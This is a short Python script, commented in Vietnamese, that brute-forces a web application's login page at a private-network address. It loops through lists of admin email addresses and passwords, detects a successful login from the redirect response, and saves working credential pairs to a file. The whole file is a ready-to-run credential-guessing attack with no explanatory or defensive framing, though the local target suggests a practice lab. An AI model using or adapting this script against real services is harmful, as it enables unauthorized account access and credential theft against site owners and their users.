import requests
import time

def brute_force_login():
    url = "http://192.168.1.2:4000/users/login"

    # Đọc danh sách email từ file
    try:
        with open("admin_emails.txt", "r") as email_file:
            emails = [line.strip() for line in email_file if line.strip()]
    except FileNotFoundError:
        print("[-] Không tìm thấy file admin_emails.txt!")
        return

    # Đọc danh sách mật khẩu từ file
    try:
        with open("passwords.txt", "r") as password_file:
            passwords = [line.strip() for line in password_file if line.strip()]
    except FileNotFoundError:
        print("[-] Không tìm thấy file passwords.txt!")
        return

    # File để ghi lại các cặp email/mật khẩu thành công
    with open("successful_logins.txt", "w") as success_file:
        # Thử từng cặp email/mật khẩu
        for email in emails:
            found = False  # Cờ để kiểm tra nếu tìm thấy cặp hợp lệ
            for password in passwords:
                data = {"email": email, "password": password}
                try:
                    response = requests.post(url, data=data, allow_redirects=False, timeout=5)
                    print(f"Thử email: {email}, mật khẩu: {password}")
                    if response.status_code == 302 and response.headers.get("Location") == "/books":
                        success_message = f"Đăng nhập thành công! Email: {email}, Mật khẩu: {password}"
                        print(success_message)
                        success_file.write(success_message + "\n")
                        found = True  # Đánh dấu đã tìm thấy
                        break  # Thoát vòng lặp mật khẩu
                    else:
                        print(f"Thất bại - Mã trạng thái: {response.status_code}, Phản hồi: {response.text[:200]}")
                except requests.exceptions.RequestException as e:
                    print(f"[-] Lỗi kết nối: {e}")
                    return
            if found:
                break  # Thoát vòng lặp email nếu đã tìm thấy cặp hợp lệ

if __name__ == "__main__":
    brute_force_login()